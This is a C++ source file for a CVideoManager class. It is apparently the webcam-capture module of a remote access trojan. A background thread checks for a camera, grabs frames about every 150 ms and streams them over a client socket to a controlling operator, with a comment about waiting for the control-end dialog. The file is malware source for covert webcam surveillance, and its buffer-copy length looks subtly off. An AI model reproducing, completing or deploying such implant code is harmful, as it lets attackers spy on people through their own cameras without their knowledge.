// VideoManager.cpp: implementation of the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////

#include "VideoManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CVideoManager::CVideoManager(CClientSocket *pClient) : CManager(pClient)
{
 	m_pVideoCap = NULL;
 	m_bIsWorking = true;
 	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

CVideoManager::~CVideoManager()
{
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
}

void CVideoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	default:	
		break;
	}	
}

void CVideoManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + sizeof(BITMAPINFOHEADER);
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_BITMAPINFOHEADER;
	memcpy(lpBuffer + 1, &(m_pVideoCap->m_lpbmi->bmiHeader), sizeof(BITMAPINFOHEADER));
	Send(lpBuffer, dwBytesLength);
	
	delete [] lpBuffer;		
}

void CVideoManager::sendNextScreen()
{
	LPVOID	lpDIB = m_pVideoCap->GetDIB();

	DWORD	dwBytesLength = 1 + m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;
	lpBuffer[0] = TOKEN_WEBCAM_DIB;

	memcpy(lpBuffer + 1, (const char *)lpDIB, dwBytesLength - 5);
	Send(lpBuffer, dwBytesLength);

	delete [] lpBuffer;
}

DWORD WINAPI CVideoManager::WorkThread( LPVOID lparam )
{
	static	dwLastScreen = GetTickCount();

	CVideoManager *pThis = (CVideoManager *)lparam;
	
	if (!pThis->Initialize())
	{
		pThis->Destroy();
		pThis->m_pClient->Disconnect();
		return -1;
	}
	pThis->sendBITMAPINFO();
	// 等控制端对话框打开
	Sleep(500);
	while (pThis->m_bIsWorking)
	{
		if ((GetTickCount() - dwLastScreen) < 150)
			Sleep(100);
		dwLastScreen = GetTickCount();
		pThis->sendNextScreen();
	}
	pThis->Destroy();

	return 0;
}

bool CVideoManager::Initialize()
{
	// 正在使用中
	if (!CVideoCap::IsWebCam())
		return false;
	m_pVideoCap = new CVideoCap;
	return m_pVideoCap->Initialize();
}

void CVideoManager::Destroy()
{
	if (m_pVideoCap)
		delete m_pVideoCap;
}
